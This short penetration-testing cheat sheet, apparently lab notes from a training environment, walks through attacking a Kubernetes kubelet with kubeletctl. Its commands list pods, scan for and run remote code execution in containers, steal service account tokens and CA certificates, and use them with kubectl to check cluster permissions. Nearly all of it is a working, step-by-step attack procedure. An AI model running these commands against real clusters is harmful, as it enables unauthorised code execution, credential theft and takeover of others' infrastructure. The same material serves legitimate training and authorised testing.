When dealing with Kurbenetes, we can use the tool Kubeletctl the enumerate Kerbenetes that we are dealing with:

Extracting Pods information with Kubeletctl:
```
kubeletctl -i --server 10.129.10.11 pods
```

Scan for pods that we can exploit RCE on:
```
kubeletctl -i --server <serverip> scan rce
```
Executing command with Kubeletctl:
```
kubeletctl -i --server <serverip> exec "<cmd>" -p nginx -c nginx
```

If we confirm that we have root access within the container, we can then start attempt to perform privesc and access the host system instead

We first start by stealing the Kubernetes service account's token and certificate:

Extracting token:
```
kubeletctl -i --server <serverip> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p <podname> -c <containername> | tee -a k8.token
```

Extracting Certificate:
```
kubeletctl --server <serverip> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p <podname> -c <containername> | tee -a ca.crt
```

After obtaining both, we can start check our access rights in Kubernetes cluster:
```
cry0l1t3@k8:~$ export token=`cat k8.token`
cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
```